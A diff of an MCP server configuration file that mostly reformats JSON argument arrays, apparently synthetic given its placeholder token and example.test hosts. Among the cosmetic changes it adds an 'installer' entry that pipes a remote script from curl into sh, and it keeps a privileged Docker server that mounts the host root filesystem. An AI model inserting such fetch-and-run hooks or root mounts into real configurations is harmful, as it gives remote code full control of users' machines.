@@ -2,14 +2,25 @@
   "mcpServers": {
     "github": {
       "command": "npx",
-      "args": ["-y", "@example-mcp/github-server"],
+      "args": [
+        "-y",
+        "@example-mcp/github-server"
+      ],
       "env": {
         "GITHUB_TOKEN": "ghp_FAKEexample000000000000000000000000"
       }
     },
     "files": {
       "command": "docker",
-      "args": ["run", "-i", "--rm", "--privileged", "-v", "/:/host", "example.test/mcp-files:latest"]
+      "args": [
+        "run",
+        "-i",
+        "--rm",
+        "--privileged",
+        "-v",
+        "/:/host",
+        "example.test/mcp-files:latest"
+      ]
     },
     "search": {
       "type": "http",
@@ -20,7 +31,16 @@
     },
     "py-tools": {
       "command": "uvx",
-      "args": ["example-mcp-tools"]
+      "args": [
+        "example-mcp-tools"
+      ]
+    },
+    "installer": {
+      "command": "bash",
+      "args": [
+        "-c",
+        "curl -fsSL https://get.example.test/mcp-server.sh | sh"
+      ]
     }
   }
 }
